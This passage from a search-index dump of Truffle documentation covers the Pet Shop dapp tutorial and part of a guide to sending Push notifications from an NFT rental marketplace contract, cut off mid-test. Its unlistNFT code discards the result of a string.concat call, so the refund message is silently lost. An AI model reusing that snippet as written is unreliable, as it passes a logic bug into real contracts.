/Users/cruzmolina/Code/truffle-projects/metacoin/build/contracts > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang", "title": "Compilation"}, {"location": "guides/pet-shop/#migration", "text": "Now that we've successfully compiled our contracts, it's time to migrate them to the blockchain! A migration is a deployment script meant to alter the state of your application's contracts , moving it from one state to the next. For the first migration, you might just be deploying new code, but over time, other migrations might move data around or replace a contract with a new one. Note : Read more about migrations in the Truffle documentation . You'll see one JavaScript file already in the migrations/ directory: 1_initial_migration.js . This handles deploying the Migrations.sol contract to observe subsequent smart contract migrations, and ensures we don't double-migrate unchanged contracts in the future. Now we are ready to create our own migration script. Create a new file named 2_deploy_contracts.js in the migrations/ directory. Add the following content to the 2_deploy_contracts.js file: var Adoption = artifacts . require ( \"Adoption\" ); module . exports = function ( deployer ) { deployer . deploy ( Adoption ); }; Before we can migrate our contract to the blockchain, we need to have a blockchain running. For this tutorial, we're going to use Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. If you haven't already, download Ganache and double click the icon to launch the application. This will generate a blockchain running locally on port 7545. Note : Read more about Ganache in the Truffle documentation . Back in our terminal, migrate the contract to the blockchain. truffle migrate You should see output similar to the following: 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3b558e9cdf1231d8ffb3445cb2f9fb01de9d0363e0b97a17f9517da318c2e5af > Blocks: 0 Seconds: 0 > contract address: 0x5ccb4dc04600cffA8a67197d5b644ae71856aEE4 > account: 0x8d9606F90B6CA5D856A9f0867a82a645e2DfFf37 > balance: 99 .99430184 > gas used: 284908 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .00569816 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0 .00569816 ETH 2_deploy_contracts.js ===================== Deploying 'Adoption' ............................. ............................. You can see the migrations being executed in order, followed by some information related to each migration. (Your information will differ.) In Ganache, note that the state of the blockchain has changed. The blockchain now shows that the current block, previously 0 , is now 4 . In addition, while the first account originally had 100 ether, it is now lower, due to the transaction costs of migration. We'll talk more about transaction costs later. You've now written your first smart contract and deployed it to a locally running blockchain. It's time to interact with our smart contract now to make sure it does what we want.", "title": "Migration"}, {"location": "guides/pet-shop/#testing-the-smart-contract-using-solidity", "text": "Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Solidity. Create a new file named TestAdoption.sol in the test/ directory. Add the following content to the TestAdoption.sol file: pragma solidity ^ 0.5.0 ; import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/Adoption.sol\" ; contract TestAdoption { // The address of the adoption contract to be tested Adoption adoption = Adoption ( DeployedAddresses . Adoption ()); // The id of the pet that will be used for testing uint expectedPetId = 8 ; //The expected owner of adopted pet is this contract address expectedAdopter = address ( this ); } We start the contract off with 3 imports: Assert.sol : Gives us various assertions to use in our tests. In testing, an assertion checks for things like equality, inequality or emptiness to return a pass/fail from our test. Here's a full list of the assertions included with Truffle . DeployedAddresses.sol : When running tests, Truffle will deploy a fresh instance of the contract being tested to the blockchain. This smart contract gets the address of the deployed contract. Adoption : The smart contract we want to test. Note : The first two imports are referring to global Truffle files, not a `truffle` directory. You should not see a `truffle` directory inside your `test/` directory. Then we define three contract-wide variables: * First, one containing the smart contract to be tested, calling the DeployedAddresses smart contract to get its address. * Second, the id of the pet that will be used to test the adoption functions. * Third, since the TestAdoption contract will be sending the transaction, we set the expected adopter address to this , a contract-wide variable that gets the current contract's address.", "title": "Testing the smart contract using Solidity"}, {"location": "guides/pet-shop/#testing-the-adopt-function", "text": "To test the adopt() function, recall that upon success it returns the given petId . We can ensure an ID was returned and that it's correct by comparing the return value of adopt() to the ID we passed in. Add the following function within the TestAdoption.sol smart contract, after the declaration of Adoption : // Testing the adopt() function function testUserCanAdoptPet () public { uint returnedId = adoption . adopt ( expectedPetId ); Assert . equal ( returnedId , expectedPetId , \"Adoption of the expected pet should match what is returned.\" ); } Things to notice: We call the smart contract we declared earlier with the ID of expectedPetId . Finally, we pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to Assert.equal() .", "title": "Testing the adopt() function"}, {"location": "guides/pet-shop/#testing-retrieval-of-a-single-pets-owner", "text": "Remembering from above that public variables have automatic getter methods, we can retrieve the address stored by our adoption test above. Stored data will persist for the duration of our tests, so our adoption of pet expectedPetId above can be retrieved by other tests. Add this function below the previously added function in TestAdoption.sol . // Testing retrieval of a single pet's owner function testGetAdopterAddressByPetId () public { address adopter = adoption . adopters ( expectedPetId ); Assert . equal ( adopter , expectedAdopter , \"Owner of the expected pet should be this contract\" ); } After getting the adopter address stored by the adoption contract, we assert equality as we did above.", "title": "Testing retrieval of a single pet's owner"}, {"location": "guides/pet-shop/#testing-retrieval-of-all-pet-owners", "text": "Since arrays can only return a single value given a single key, we create our own getter for the entire array. Add this function below the previously added function in TestAdoption.sol . // Testing retrieval of all pet owners function testGetAdopterAddressByPetIdInArray () public { // Store adopters in memory rather than contract's storage address [ 16 ] memory adopters = adoption . getAdopters (); Assert . equal ( adopters [ expectedPetId ], expectedAdopter , \"Owner of the expected pet should be this contract\" ); } Note the memory attribute on adopters . The memory attribute tells Solidity to temporarily store the value in memory, rather than saving it to the contract's storage. Since adopters is an array, and we know from the first adoption test that we adopted pet expectedPetId , we compare the testing contracts address with location expectedPetId in the array.", "title": "Testing retrieval of all pet owners"}, {"location": "guides/pet-shop/#testing-the-smart-contract-using-javascript", "text": "Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Javascript using the Chai and Mocha libraries. Create a new file named testAdoption.test.js in the test/ directory. Add the following content to the testAdoption.test.js file: const Adoption = artifacts.require(\"Adoption\"); contract(\"Adoption\", (accounts) => { let adoption; let expectedPetId; before(async () => { adoption = await Adoption.deployed(); }); describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); }); }); We start the contract by importing : * Adoption : The smart contract we want to test We begin our test by importing our Adoption contract using artifacts.require . Note : When writing this test, our callback function take the argument accounts . This provides us with the accounts available on the network when using this test. Then, we make use of the before to provide initial setups for the following: * Adopt a pet with id 8 and assign it to the first account within the test accounts on the network. * This function later is used to check whether the petId: 8 has been adopted by accounts[0] . ### Testing the adopt function To test the adopt function, recall that upon success it returns the given adopter . We can ensure that the adopter based on given petID was returned and is compared with the expectedAdopter within the adopt function. Add the following function within the testAdoption.test.js test file, after the declaration of before code block. describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); it(\"can fetch the address of an owner by pet id\", async () => { const adopter = await adoption.adopters(8); assert.equal(adopter, expectedAdopter, \"The owner of the adopted pet should be the first account.\"); }); }); Things to notice: We call smart contract method adopters to see what address adopted the pet with petID 8. Truffle imports Chai for the user so we can use the assert functions. We pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to assert.equal() . ### Testing retrieval of all pet owners Since arrays can only return a single value given a single key, we create our own getter for the entire array. Add this function below the previously added function in testAdoption.test.js . it(\"can fetch the collection of all pet owners' addresses\", async () => { const adopters = await adoption.getAdopters(); assert.equal(adopters[8], expectedAdopter, \"The owner of the adopted pet should be in the collection.\"); }); Since adopters is an array, and we know from the first adoption test that we adopted the pet with petId 8, we are comparing the contract's address with the address that we expect to find.", "title": "Testing the smart contract using JavaScript"}, {"location": "guides/pet-shop/#running-the-tests", "text": "Back in the terminal, run the tests: truffle test If all the tests pass, you'll see console output similar to this: Using network 'development' . Compiling your contracts... =========================== > Compiling ./test/TestAdoption.sol > Artifacts written to /var/folders/z3/v0sd04ys11q2sh8tq38mz30c0000gn/T/test-11934-19747-g49sra.0ncrr > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang TestAdoption \u2713 testUserCanAdoptPet ( 91ms ) \u2713 testGetAdopterAddressByPetId ( 70ms ) \u2713 testGetAdopterAddressByPetIdInArray ( 89ms ) 3 passing ( 670ms )", "title": "Running the tests"}, {"location": "guides/pet-shop/#creating-a-user-interface-to-interact-with-the-smart-contract", "text": "Now that we've created the smart contract, deployed it to our local test blockchain and confirmed we can interact with it via the console, it's time to create a UI so that Pete has something to use for his pet shop! Included with the pet-shop Truffle Box was code for the app's front-end. That code exists within the src/ directory. The front-end doesn't use a build system (webpack, grunt, etc.) to be as easy as possible to get started. The structure of the app is already there; we'll be filling in the functions which are unique to Ethereum. This way, you can take this knowledge and apply it to your own front-end development.", "title": "Creating a user interface to interact with the smart contract"}, {"location": "guides/pet-shop/#instantiating-web3", "text": "Open /src/js/app.js in a text editor. Examine the file. Note that there is a global App object to manage our application, load in the pet data in init() and then call the function initWeb3() . The web3 JavaScript library interacts with the Ethereum blockchain. It can retrieve user accounts, send transactions, interact with smart contracts, and more. Remove the multi-line comment from within initWeb3 and replace it with the following: // Modern dapp browsers... if ( window . ethereum ) { App . web3Provider = window . ethereum ; try { // Request account access await window . ethereum . enable (); } catch ( error ) { // User denied account access... console . error ( \"User denied account access\" ) } } // Legacy dapp browsers... else if ( window . web3 ) { App . web3Provider = window . web3 . currentProvider ; } // If no injected web3 instance is detected, fall back to Ganache else { App . web3Provider = new Web3 . providers . HttpProvider ( 'http://localhost:7545' ); } web3 = new Web3 ( App . web3Provider ); Things to notice: First, we check if we are using modern dapp browsers or the more recent versions of MetaMask where an ethereum provider is injected into the window object. If so, we use it to create our web3 object, but we also need to explicitly request access to the accounts with ethereum.enable() . If the ethereum object does not exist, we then check for an injected web3 instance. If it exists, this indicates that we are using an older dapp browser (like Mist or an older version of MetaMask). If so, we get its provider and use it to create our web3 object. If no injected web3 instance is present, we create our web3 object based on our local provider. (This fallback is fine for development environments, but insecure and not suitable for production.)", "title": "Instantiating web3"}, {"location": "guides/pet-shop/#instantiating-the-contract", "text": "Now that we can interact with Ethereum via web3, we need to instantiate our smart contract so web3 knows where to find it and how it works. Truffle has a library to help with this called @truffle/contract . It keeps information about the contract in sync with migrations, so you don't need to change the contract's deployed address manually. Still in /src/js/app.js , remove the multi-line comment from within initContract and replace it with the following: $ . getJSON ( 'Adoption.json' , function ( data ) { // Get the necessary contract artifact file and instantiate it with @truffle/contract var AdoptionArtifact = data ; App . contracts . Adoption = TruffleContract ( AdoptionArtifact ); // Set the provider for our contract App . contracts . Adoption . setProvider ( App . web3Provider ); // Use our contract to retrieve and mark the adopted pets return App . markAdopted (); }); Things to notice: We first retrieve the artifact file for our smart contract. Artifacts are information about our contract such as its deployed address and Application Binary Interface (ABI) . The ABI is a JavaScript object defining how to interact with the contract including its variables, functions and their parameters. Once we have the artifacts in our callback, we pass them to TruffleContract() . This creates an instance of the contract we can interact with. With our contract instantiated, we set its web3 provider using the App.web3Provider value we stored earlier when setting up web3. We then call the app's markAdopted() function in case any pets are already adopted from a previous visit. We've encapsulated this in a separate function since we'll need to update the UI any time we make a change to the smart contract's data.", "title": "Instantiating the contract"}, {"location": "guides/pet-shop/#getting-the-adopted-pets-and-updating-the-ui", "text": "Still in /src/js/app.js , remove the multi-line comment from markAdopted and replace it with the following: var adoptionInstance ; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; return adoptionInstance . getAdopters . call (); }). then ( function ( adopters ) { for ( i = 0 ; i < adopters . length ; i ++ ) { if ( adopters [ i ] !== '0x0000000000000000000000000000000000000000' ) { $ ( '.panel-pet' ). eq ( i ). find ( 'button' ). text ( 'Success' ). attr ( 'disabled' , true ); } } }). catch ( function ( err ) { console . log ( err . message ); }); Things to notice: We access the deployed Adoption contract, then call getAdopters() on that instance. We first declare the variable adoptionInstance outside of the smart contract calls so we can access the instance after initially retrieving it. Using call() allows us to read data from the blockchain without having to send a full transaction, meaning we won't have to spend any ether. After calling getAdopters() , we then loop through all of them, checking to see if an address is stored for each pet. Since the array contains address types, Ethereum initializes the array with 16 empty addresses. This is why we check for an empty address string rather than null or other falsey value. Once a petId with a corresponding address is found, we disable its adopt button and change the button text to \"Success\", so the user gets some feedback. Any errors are logged to the console.", "title": "Getting The Adopted Pets and Updating The UI"}, {"location": "guides/pet-shop/#handling-the-adopt-function", "text": "Still in /src/js/app.js , remove the multi-line comment from handleAdopt and replace it with the following: var adoptionInstance ; web3 . eth . getAccounts ( function ( error , accounts ) { if ( error ) { console . log ( error ); } var account = accounts [ 0 ]; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; // Execute adopt as a transaction by sending account return adoptionInstance . adopt ( petId , { from : account }); }). then ( function ( result ) { return App . markAdopted (); }). catch ( function ( err ) { console . log ( err . message ); }); }); Things to notice: We use web3 to get the user's accounts. In the callback after an error check, we then select the first account. From there, we get the deployed contract as we did above and store the instance in adoptionInstance . This time though, we're going to send a transaction instead of a call. Transactions require a \"from\" address and have an associated cost. This cost, paid in ether, is called gas . The gas cost is the fee for performing computation and/or storing data in a smart contract. We send the transaction by executing the adopt() function with both the pet's ID and an object containing the account address, which we stored earlier in account . The result of sending a transaction is the transaction object. If there are no errors, we proceed to call our markAdopted() function to sync the UI with our newly stored data.", "title": "Handling the adopt() Function"}, {"location": "guides/pet-shop/#interacting-with-the-dapp-in-a-browser", "text": "Now we're ready to use our dapp!", "title": "Interacting with the dapp in a browser"}, {"location": "guides/pet-shop/#installing-and-configuring-metamask", "text": "The easiest way to interact with our dapp in a browser is through MetaMask , a browser extension for both Chrome and Firefox. Install MetaMask in your browser. Once installed, a tab in your browser should open displaying the following: After clicking Getting Started , you should see the initial MetaMask screen. Click Import Wallet . Next, you should see a screen requesting anonymous analytics. Choose to decline or agree. In the box marked Wallet Seed , enter the mnemonic that is displayed in Ganache. **Warning**: Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Enter a password below that and click OK . If all goes well, MetaMask should display the following screen. Click All Done . Now we need to connect MetaMask to the blockchain created by Ganache. Click the menu that shows \"Main Network\" and select Custom RPC . In the box titled \"New Network\" enter http://127.0.0.1:7545 and click Save . The network name at the top will switch to say http://127.0.0.1:7545 . Click the top-right X to close out of Settings and return to the Accounts page. Each account created by Ganache is given 100 ether. You'll notice it's slightly less on the first account because some gas was used when the contract itself was deployed and when the tests were run. Configuration is now complete.", "title": "Installing and configuring MetaMask"}, {"location": "guides/pet-shop/#installing-and-configuring-lite-server", "text": "We can now start a local web server and use the dapp. We're using the lite-server library to serve our static files. This shipped with the pet-shop Truffle Box, but let's take a look at how it works. Open bs-config.json in a text editor (in the project's root directory) and examine the contents: { \"server\" : { \"baseDir\" : [ \"./src\" , \"./build/contracts\" ] } } This tells lite-server which files to include in our base directory. We add the ./src directory for our website files and ./build/contracts directory for the contract artifacts. We've also added a dev command to the scripts object in the package.json file in the project's root directory. The scripts object allows us to alias console commands to a single npm command. In this case we're just doing a single command, but it's possible to have more complex configurations. Here's what yours should look like: \"scripts\" : { \"dev\" : \"lite-server\" , \"test\" : \"echo \\\"Error: no test specified\\\" && exit 1\" }, This tells npm to run our local install of lite-server when we execute npm run dev from the console.", "title": "Installing and configuring lite-server"}, {"location": "guides/pet-shop/#using-the-dapp", "text": "Start the local web server: npm run dev The dev server will launch and automatically open a new browser tab containing your dapp. A MetaMask pop-up should appear requesting your approval to allow Pete's Pet Shop to connect to your MetaMask wallet. Without explicit approval, you will be unable to interact with the dapp. Click Connect . To use the dapp, click the Adopt button on the pet of your choice. You'll be automatically prompted to approve the transaction by MetaMask. Click Submit to approve the transaction. You'll see the button next to the adopted pet change to say \"Success\" and become disabled, just as we specified, because the pet has now been adopted. Note : If the button doesn't automatically change to say \"Success\", refreshing the app in the browser should trigger it. And in MetaMask, you'll see the transaction listed: You'll also see the same transaction listed in Ganache under the \"Transactions\" section. Congratulations! You have taken a huge step to becoming a full-fledged dapp developer. For developing locally, you have all the tools you need to start making more advanced dapps. If you'd like to make your dapp live for others to use, stay tuned for our future tutorial on deploying to the Ropsten testnet.", "title": "Using the dapp"}, {"location": "guides/push-notification/", "text": "Web3 Unleashed: How to Add Notifications to Your Dapp \u00b6 Written by Emily Lin Last updated 1/05/2023 Overview \u00b6 Our full-stack NFT rental marketplace is done! We created a rentable NFT , wrote a rental marketplace smart contract , and built a frontend to tie it all together. In this guide, we'll be adding some details to improve the user experience: using Push to send decentralized notifications whenever a user's rental has expired. Additionally, we'll be using ganache forking to test our contracts and interact with the Push contracts locally before deploying to an actual testnet or mainnet. Watch the livestream on YouTube for a more in-depth walkthrough and to hear from core dev, Fabio, about how Push is changing up Web3 communication! The completed code lives here . NOTE: We are only interacting with the smart contracts, so you can ignore the client folder. Download System Requirements \u00b6 You'll need to install: Node.js , v14 or higher truffle ganache CLI Create an Infura account and project \u00b6 To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it rentable-nft-marketplace , and select Web3 API from the dropdown. Register for a MetaMask wallet \u00b6 To interact with your DApp in the browser, you'll need a MetaMask wallet. You can download it and create one here . Download VS Code \u00b6 Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here . Get Some Test Eth \u00b6 In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once. Set Up Your Project \u00b6 We'll be starting with the marketplace contracts we wrote in episode 4 . Go ahead and clone the main project here . Since we're only interacting with the smart contracts in this tutorial, we'll just go to the truffle folder and install our dependencies. cd unleashed_nft_rental_marketplace/truffle npm i Create a Channel in Push \u00b6 In order to send notifications, we need to create a channel for users to subscribe to. To create a channel, see the Push docs here . In this guide, we are only building on Ethereum, so ignore any instructions for multi-chain channels. Additionally, we are deploying on Goerli and NOT multi-chain, so make sure you're creating your channel through the staging dapp - NOT the prod dapp. Do note that you'll need 50 Goerli PUSH in order to deploy your channel! Their staging dapp has a link that will send some to your wallet. Note that the address of your channel is the account address you deployed with. Additionally, you can only have one channel per address. Create IPUSHCommInterface.sol \u00b6 In order to send notifications from our marketplace smart contract, we need to interact with Push's deployed contracts. First, we'll create a IPUSHCommInterface interface contract to be able to call those methods. truffle create contract IPUSHCommInterface Then, copy and paste in this code: // PUSH Comm Contract Interface interface IPUSHCommInterface { function sendNotification ( address _channel , address _recipient , bytes calldata _identity ) external ; } Call sendNotification \u00b6 Now that we have the interface contract, we can go ahead and call sendNotification on Push's deployed contract to alert our users that their rental was unlisted. We want to notify the user which NFT was unlisted in the notification message, which is of type string. However, it's not straightforward to convert the address type into a string type. Luckily, OpenZeppelin provides the Strings library to help with these types of conversions. Import it at the top of the Marketplace contract: import \"@openzeppelin/contracts/utils/Strings.sol\" ; Then, to construct the notification message, add the following code before we clean up the Marketplace data in unlistNFT . string memory body = string . concat ( \"Your NFT rental from \" , Strings . toHexString ( nftContract ), \" with tokenId \" , Strings . toString ( tokenId ), \" has expired.\" ); if ( msg . sender == listing . owner ) { string . concat ( body , \" Your rental NFT was unlisted by the owner, so you have been refunded \" , Strings . toString ( refund ), \" ETH.\" ); } Afterwards, call sendNotification afterwards: IPUSHCommInterface ( address ( 0xb3971BCef2D791bc4027BbfedFb47319A4AAaaAa )). sendNotification ( address ( YOUR_CHANNEL_ADDRESS ), // from channel - recommended to set channel via dApp and put it's value -> then once contract is deployed, go back and add the contract address as delegate for your channel listing . user , // to recipient, put address(this) in case you want Broadcast or Subset. For Targetted put the address to which you want to send bytes ( string ( // We are passing identity here: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/identity/payload-identity-implementations abi . encodePacked ( \"0\" , // this is notification identity: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/identity/payload-identity-implementations \"+\" , // segregator \"3\" , // this is payload type: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/payload (1, 3 or 4) = (Broadcast, targetted or subset) \"+\" , // segregator \"Your NFT rental has expired\" , // this is notification title \"+\" , // segregator body // notification body ) ) ) ); Note that 0xb3971BCef2D791bc4027BbfedFb47319A4AAaaAa is the address for the Push contract deployed on Goerli. If you're not deploying on Goerli, you can find the appropriate smart contract address for your desired chain here . You'll be using the address listed under EPNS CommV1 . The final unlistNFT function looks like this: // function to unlist your rental, refunding the user for any lost time function unlistNFT ( address nftContract , uint256 tokenId ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . owner != address ( 0 ), \"This NFT is not listed\" ); require ( listing . owner == msg . sender || _marketOwner == msg . sender , \"Not approved to unlist NFT\" ); // fee to be returned to user if unlisted before rental period is up // nothing to refund if no renter uint256 refund = 0 ; if ( listing . user != address ( 0 )) { refund = (( listing . expires - block . timestamp ) / 60 / 60 / 24 + 1 ) * listing . pricePerDay ; require ( msg . value >= refund , \"Not enough ether to cover refund\" ); payable ( listing . user ). transfer ( refund ); } string memory body = string . concat ( \"Your NFT rental from \" , Strings . toHexString ( nftContract ), \" with tokenId \" , Strings . toString ( tokenId ), \" has expired.\" ); if ( msg . sender == listing . owner ) { string . concat ( body , \" Your rental NFT was unlisted by the owner, so you have been refunded \" , Strings . toString ( refund ), \" ETH.\" ); } IPUSHCommInterface ( address ( 0xb3971BCef2D791bc4027BbfedFb47319A4AAaaAa )). sendNotification ( address ( 0xA31618621805C9215B5Ade58EB09dBA8f32Bbdb8 ), // from channel - recommended to set channel via dApp and put it's value -> then once contract is deployed, go back and add the contract address as delegate for your channel listing . user , // to recipient, put address(this) in case you want Broadcast or Subset. For Targetted put the address to which you want to send bytes ( string ( // We are passing identity here: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/identity/payload-identity-implementations abi . encodePacked ( \"0\" , // this is notification identity: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/identity/payload-identity-implementations \"+\" , // segregator \"3\" , // this is payload type: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/payload (1, 3 or 4) = (Broadcast, targetted or subset) \"+\" , // segregator \"Your NFT rental has expired\" , // this is notification title \"+\" , // segregator body // notification body ) ) ) ); // clean up data IERC4907 ( nftContract ). setUser ( tokenId , address ( 0 ), 0 ); EnumerableSet . remove ( _nftContractTokensMap [ nftContract ], tokenId ); delete _listingMap [ nftContract ][ tokenId ]; if ( EnumerableSet . length ( _nftContractTokensMap [ nftContract ]) == 0 ) { EnumerableSet . remove ( _nftContracts , nftContract ); } _nftsListed . decrement (); emit NFTUnlisted ( msg . sender , nftContract , tokenId , refund ); } Deploy the Marketplace contract and add it as a delegate \u00b6 In order for the contract address to send a notification, it needs to be set as a delegate by Push. To do so, follow the instructions here . First, we need to deploy the contract onto Goerli. We can do this with Truffle Dashboard . Connect to Goerli with MetaMask after bringing up Dashboard. truffle dashboard truffle migrate --network dashboard Then, add the deployed contract address as delegate through the staging dapp you created your channel in. Test notifications locally \u00b6 Because our Marketplace contract now interacts with the Push contract on Goerli, we have to run our tests against a forked version of Ganache. We can do so without any configuration, due to Infura's free archive node access. Spin it up in a different terminal: ganache --fork goerli Then, in our tests, we need to reference the specific contract addresses we just deployed on Goerli. You can do so by replacing Marketplace.deployed() and RentableNft.deployed() with the following: marketplace = await Marketplace . at ( \"MARKETPLACE_GOERLI_ADDRESS\" ); rentableNft = await RentableNft . at ( \"NFT_GOERLI_ADDRESS\" ); Additionally, you'll need to replace MARKETPLACE_OWNER with the actual address you deployed your contracts with. Your final test code should look like this: require ( \"@openzeppelin/test-helpers/configure\" )({ provider : web3 . currentProvider , singletons : { abstraction : \"truffle\" , }, }); const { balance , constants , ether , expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const Marketplace = artifacts . require ( \"Marketplace\" ); const RentableNft = artifacts . require ( \"RentableNft\" ); const TODAY = Math . floor ( Date . now () / 1000 ); const TODAY_2 = TODAY + ( 60 * 60 ); const YESTERDAY = TODAY - ( 24 * 60 * 60 ); const TOMORROW = TODAY + ( 24 * 60 * 60 ); const IN_FIVE_DAYS = TODAY + ( 24 * 60 * 60 * 5 ); function assertListing ( actual , expected ) { assert . equal ( actual . owner , expected . owner , \"Owner is not correct\" ); assert . equal ( actual . user , expected . user , \"User is not correct\" ); assert . equal ( actual . nftContract , expected . nftContract , \"NFT contract is not correct\" ); assert . equal ( actual . tokenId , expected . tokenId , \"TokenId is not correct\" ); assert . equal ( actual . pricePerDay , expected . pricePerDay , \"Price per day is not correct\" ); assert . equal ( actual . startDateUNIX , expected . startDateUNIX , \"Start date is not correct\" ); assert . equal ( actual . endDateUNIX , expected . endDateUNIX , \"End date is not correct\" ); assert . equal ( actual . expires , expected . expires , \"Expires date is not correct\" ); } async function assertNFT ( nftContractInstance , tokenId , expectedUser , expectedExpires ) { let user = await nftContractInstance . userOf . call ( tokenId ); let expires = await nftContractInstance . userExpires . call ( tokenId ); assert . equal ( user , expectedUser , \"User is not correct\" ); assert . equal ( expires , expectedExpires , \"Expires date is incorrect\" ); } // EnumerableSet makes no guarantee about ordering, so we have to find the matching tokenId function getListing ( listings , tokenId ) { let listing = {}; listings . every (( _listing ) => { if ( _listing . tokenId == tokenId ) { listing = _listing ; return false ; } else { return true ; } }); return listing } function listingToString ( listing ) { let listingCopy = {... listing }; listingCopy . tokenId = listing . tokenId . toString (); listingCopy . pricePerDay = listing . pricePerDay . toString (); listingCopy . startDateUNIX = listing . startDateUNIX . toString (); listingCopy . endDateUNIX = listing . endDateUNIX . toString (); listingCopy . expires = listing . expires . toString (); if ( \"rentalFee\" in listing ) { listingCopy . rentalFee = listing . rentalFee . toString (); } } contract ( \"Marketplace\" , function ( accounts ) { const MARKETPLACE_OWNER = \"YOUR_ACCOUNT_ADDRESS\" ; const TOKEN_OWNER = accounts [ 1 ]; const USER = accounts [ 2 ]; let marketplace ; let rentableNft ; let nftContract ; let listingFee ; let tokenID1 ; let tokenID2 ; let tokenID3 ; before ( 'should reuse variables' , async () => { marketplace = await Marketplace . at ( \"MARKETPLACE_GOERLI_ADDRESS\" ); rentableNft = await RentableNft . at ( \"NFT_GOERLI_ADDRESS\" ); nftContract = rentableNft . address ; listingFee = ( await marketplace . getListingFee ()). toString (); // mint nfts for testing tokenID1 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); tokenID2 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); tokenID3 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); }); it ( \"should list nfts\" , async function () { let tracker = await balance . tracker ( MARKETPLACE_OWNER ); await tracker . get (); let txn = await marketplace . listNFT ( nftContract , tokenID1 , ether ( \"1\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); assert . equal ( await tracker . delta (), listingFee , \"Listing fee not transferred\" ); let expectedListing = { owner : TOKEN_OWNER , user : constants . ZERO_ADDRESS , nftContract : nftContract , tokenId : tokenID1 , pricePerDay : ether ( \"1\" ), startDateUNIX : TOMORROW , endDateUNIX : IN_FIVE_DAYS , expires : 0 }; assertListing ( getListing ( await marketplace . getAllListings . call (), tokenID1 ), expectedListing ); expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); await tracker . get (); txn = await marketplace . listNFT ( nftContract , tokenID2 , ether ( \".5\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); assert . equal ( await tracker . delta (), listingFee , \"Listing fee not transferred\" ); expectedListing . tokenId = tokenID2 ; expectedListing . pricePerDay = ether ( \".5\" ); expectedListing . startDateUNIX = TOMORROW ; expectedListing . endDateUNIX = IN_FIVE_DAYS ; expectedListing . expires = 0 ; assertListing ( getListing ( await marketplace . getAllListings . call (), tokenID2 ), expectedListing ); expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); }); it ( \"should validate listings\" , async function () { await expectRevert ( marketplace . listNFT ( marketplace . address , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Contract is not an ERC4907\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : accounts [ 2 ], value : listingFee }), \"Not owner of nft\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER }), \"Not enough ether for listing fee\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 0 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Rental price should be greater than 0\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , YESTERDAY , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Start date cannot be in the past\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , IN_FIVE_DAYS , YESTERDAY , { from : TOKEN_OWNER , value : listingFee }), \"End date cannot be before the start date\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"This NFT has already been listed\" ); }); it ( \"should modify listings and nft contract when nft is rented\" , async function () { assertNFT ( rentableNft , tokenID1 , constants . ZERO_ADDRESS , 0 ); assertNFT ( rentableNft , tokenID2 , constants . ZERO_ADDRESS , 0 ); let tracker = await balance . tracker ( TOKEN_OWNER ); await tracker . get (); let txn = await marketplace . rentNFT ( nftContract , 